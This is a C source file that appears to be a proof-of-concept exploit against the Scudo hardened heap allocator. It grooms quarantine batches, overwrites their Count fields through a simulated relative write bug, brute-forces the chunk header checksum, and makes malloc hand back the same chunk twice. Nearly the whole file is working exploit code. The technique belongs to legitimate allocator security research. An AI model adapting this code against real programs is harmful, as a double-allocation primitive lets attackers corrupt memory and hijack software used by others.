#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>

#define CRC32_(crc, value) __asm__("crc32\t" "(%1), %0" : "=r"(crc) : "r"(value), "0"(crc))
size_t *x;

// fill a QBatch by hitting the 1019 Count limit
void fill_3(){
	for(int i=0;i<1019; i++) {
		free(malloc(1));
	}
}

// fill a QBatch and forge the chunk we want to return twice
void fill_2(size_t *ptr, size_t size, size_t count){
	fill_qbatch(count-1, size);
	free(ptr);
}

// fill a QBatch by hitting the Size limit and control the value of Count
void fill_qbatch(size_t n, size_t y){ 
	size_t x = (0x10000-8176-y)+1;
	size_t *tmp=0;
	int zp = n - (x % n);
	int pp = x/n;
	for(int i=0;i<n;i++) {
		if(i>=zp){
			tmp = malloc(pp + 1);
		}else{
			tmp = malloc(pp);
		}
		free(tmp);
	}
}

u_int32_t crc32(u_int32_t crc, void const *buf) {
        size_t crc0 = crc;
        CRC32_(crc0, &buf);
        return crc0;
}
size_t find_cksum(size_t cksum_inuse){ // Checksum while chunk is in use.
	unsigned int i=0;
        unsigned int _crc = 0;
        char *chunk_ptr = 0x41414141; // Doesn't really matter as you can guess. (Since it's constant)
        do{
                i++;
                _crc = crc32(crc32(i, chunk_ptr), 0x10101);
                _crc = _crc ^ _crc>>0x10;
        }while(_crc!=cksum_inuse);
        _crc = crc32(crc32(i, chunk_ptr), 0x10201);
        _crc = _crc ^ _crc>>0x10;
        return _crc&0xffff;

}

int main(){
	//printf("PID: %ld\n\n", (long)getpid());
	// scudo allocator 101 ;)
	size_t *y, *z;
	u_int32_t cksum_inuse, returned_once = 0;

	z = malloc(8176); // chunk in the same region as QuarantineBatches. Will simulate a relative write bug on it.  
	x = malloc(0x10); // Chunk we will try making the allocator return twice. Size is randomly 0x10, any would work. Will simulate we could read & corrupt its header.
	cksum_inuse = *(x-2)>>(8*6); // This simulates we are able to read its header.

	// QuarantineBatch fengshui 
	for(int j=0;j<2; j++) {
		for(int i=0;i<6; i++) {
			fill_3();
		}
		fill_qbatch(600, 0xd782);
	}

	fill_3(); 
	fill_qbatch(420, 8176+0x3fb); // Qbatch_1
	fill_2(x, 0x10, 451); // Qbatch_2
	for(int j=0;j<2; j++) fill_3();
	
	fill_qbatch(450, (0x3fb+8176)*2); // new QBatch that will hold the old contents of Qbatch_2, the 451th node is X chunk.
	
	for(int i=0; i<0x6; i++) fill_3(); 
	fill_qbatch(600, 0xd782);
	
	for(int i=0; i<0xb; i++){          // Corrupting every QuarantineBatch's Count variable will
		*(z+0x2402+0x400*i) = 451; // work for this example, so we don't even need to know
	}                                  // the exact position of the target QuarantineBatch. Just 
	                                   // corrupt most of them. It has very good chances to succeed.

	for(int i=0;i<0x20000; i++){		
		size_t *p = malloc(0x10);
		if(p==x) {	
			if(returned_once){
				printf("[+] Achieved double return ;)\n");
				return;
			}
			returned_once = 1;
			printf("[!] Bruteforcing to find the correct checksum and fix it\n");
			*(x-2) = (find_cksum(cksum_inuse)<<(8*6))+0x10201; // Calculate correct cksum and set Quarantined header flag
		}
		free(malloc(0x123)); // Slowly repopulate Quarantine
	}
}
